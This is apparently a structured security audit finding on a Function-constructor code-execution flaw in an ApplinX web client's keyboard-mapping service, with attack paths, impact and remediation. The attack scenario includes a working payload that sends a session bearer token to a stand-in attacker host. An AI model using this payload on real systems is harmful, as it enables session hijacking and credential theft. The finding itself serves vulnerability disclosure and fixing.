investigation.root_cause: KeyboardMappingService.checkKeyboardMappings() (keyboard-mapping.service.ts:133-150) performs dynamic bracket-notation dispatch: this.jsFunc[methodName](param) where methodName is extracted from the targetFunction string in KeyboardMappings.json or from server-supplied keyboard mappings (initMapping(res.keyboardMapping)). The only guard is a truthiness check `if(this.jsFunc[methodName])`. JavaScript's prototype chain is fully accessible via bracket notation — this.jsFunc['constructor'] returns the Function constructor (a truthy value). Therefore, an attacker-controlled targetFunction value of 'constructor(PAYLOAD)' causes this.jsFunc.constructor(PAYLOAD)() to be executed, which is eval-equivalent new Function() arbitrary code execution. The IJSFunctionService interface is empty (no methods defined), meaning any bracket-notation access falls through to the prototype chain.
investigation.attack_scenario:
Attack Path 1 (Static Asset Tampering): Attacker modifies KeyboardMappings.json (no lockfile VULN-014, no artifact signing VULN-018, no integrity check). Sets targetFunction = 'constructor(document.location="https://attacker.com/?t="+sessionStorage.getItem("gx_token"))'. User presses the mapped key combination. KeyboardMappingService extracts methodName='constructor', param='document.location=...'. this.jsFunc['constructor'] is Function constructor (truthy). this.jsFunc['constructor']('document.location=...')() executes. Bearer token exfiltrated.

Attack Path 2 (ApplinX Server Compromise): Compromised ApplinX server returns malicious keyboardMapping in CreateSessionResponse. Same execution path — methodName='constructor', arbitrary code runs on first matching keypress.
prerequisites: Attacker must modify KeyboardMappings.json (supply chain / static asset tampering) OR compromise ApplinX REST API server to inject malicious keyboard mappings
User must press the key combination mapped to the malicious targetFunction
No allowlist of permitted method names in JSFunctionsService (confirmed — interface is empty)

privilege_boundary.start_privilege: Static asset modification capability (supply chain) or ApplinX server compromise
privilege_boundary.achieved_privilege: Arbitrary JavaScript execution in authenticated user's browser — full DOM access, sessionStorage read, network exfiltration, credential theft

impact.description: Eval-equivalent RCE in browser context. Attacker can: exfiltrate Bearer token from sessionStorage (enabling full ApplinX session hijack), read all terminal screen content, capture credentials from DOM password fields, execute arbitrary ApplinX host commands via sendKeys, and pivot to other application state. Combined attack chain: VULN-002 → VULN-008 (token theft via sessionStorage) → full host session takeover. This is the highest-severity finding in the assessment.

sources: KeyboardMappings.json 'targetFunction' string — static file, same-origin in production
ApplinX REST API CreateSessionResponse/GetInfoResponse keyboardMapping array — server-controlled
transformations: keyFunc.substring(0, beginBracket) extracts methodName — no validation
if(this.jsFunc[methodName]) truthiness check — does NOT block prototype chain (constructor is truthy)
this.jsFunc[methodName](param) — bracket-notation call on prototype chain
sinks: this.jsFunc[methodName](param) at keyboard-mapping.service.ts:140 — arbitrary code execution via Function constructor
this.navigationService.sendKeys(keyFunc) at line 145 — arbitrary key value sent to ApplinX host (VULN-019)

direct.impact: Eval-equivalent code execution — prototype chain traversal to Function constructor
No method allowlist defined; any bracket-notation access falls through to prototype

indirect.impact: Bearer token accessible to arbitrary JS executed via this path
Attack vector for static asset tampering — no integrity protection
Supply chain attack enables injecting malicious KeyboardMappings.json
No artifact signing — modified JSON undetectable in build pipeline

remediation_guidance.recommended_fix: Add a hasOwnProperty check AND an explicit allowlist before dispatch: `if (!Object.prototype.hasOwnProperty.call(this.jsFunc, methodName)) { this.logger.error('Blocked: method not on jsFunc own properties'); return; }`. Additionally define an explicit allowed method list in IJSFunctionService and verify methodName is in that list. This eliminates prototype chain access entirely.
defense_in_depth: Define explicit allowlist: const ALLOWED = new Set(['method1', 'method2']); if (!ALLOWED.has(methodName)) reject
Validate KeyboardMappings.json targetFunction against strict regex: only letters/digits allowed in method name portion
Enable artifact signing (VULN-018) to detect static asset tampering
Consider using a compile-time method dispatch enum instead of runtime string lookup

external: CWE-913: Improper Control of Dynamically-Managed Code Resources
